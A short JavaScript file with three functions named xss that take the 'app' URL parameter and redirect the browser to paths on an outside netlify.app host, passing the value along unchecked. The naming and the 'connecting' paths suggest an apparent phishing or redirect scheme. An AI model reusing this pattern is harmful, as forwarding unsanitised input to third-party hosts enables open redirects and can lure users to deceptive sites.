function xss() {
const urlParams = new URLSearchParams(window.location.search);
const myParam = urlParams.get('app'); 
const myParam2 = "practicalpot"; 
window.location = "https://"+ myParam2+".netlify.app/Art/connecting?app="+ myParam;
}

function xss2() {
const urlParams = new URLSearchParams(window.location.search);
const myParam = urlParams.get('app'); 
const myParam2 = "practicalpot"; 
window.location = "https://"+ myParam2+".netlify.app/Pet/connecting?app="+ myParam;
}

function xss3() {
const urlParams = new URLSearchParams(window.location.search);
const myParam = urlParams.get('app'); 
const myParam2 = "practicalpot"; 
window.location = "https://"+ myParam2+".netlify.app/Petition/connecting?app="+ myParam;
}